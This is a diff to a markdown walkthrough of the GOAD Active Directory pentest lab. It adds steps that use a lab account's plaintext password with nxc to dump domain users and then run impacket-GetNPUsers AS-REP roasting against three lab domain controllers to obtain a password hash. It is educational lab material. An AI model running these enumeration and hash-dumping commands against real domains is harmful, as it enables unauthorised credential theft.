@@ -230,18 +230,32 @@ Then, the account is used to dump usernames to users.txt
 nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_' --users | tee users.txt
 ```
 
+<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/11-users-list-5th-column.png'><br><ins>List of users</ins></div>
 
-
-
-
+extracting the 5th column
 ```bash
 awk '{print $5}' users.txt | sort | uniq | tee users2.tx
 ```
 
+The impacket command can now be run, we need to cycle through each dc-ip and domain pair
+
+```bash
+
+impacket-GetNPUsers -dc-ip 192.168.56.10 'sevenkingdoms.local/' -no-pass -usersfile users2.txt
+
+impacket-GetNPUsers -dc-ip 192.168.56.11 'north.sevenkingdoms.local/' -no-pass -usersfile users2.txt
+
+impacket-GetNPUsers -dc-ip 192.168.56.12 'essos.local/' -no-pass -usersfile users2.txt
+
+```
+
+
+ It is observed that the second command has dumped the hash for us. 
+
+
+
+
 #### Brandon Stark
-
-
-
 
 
 
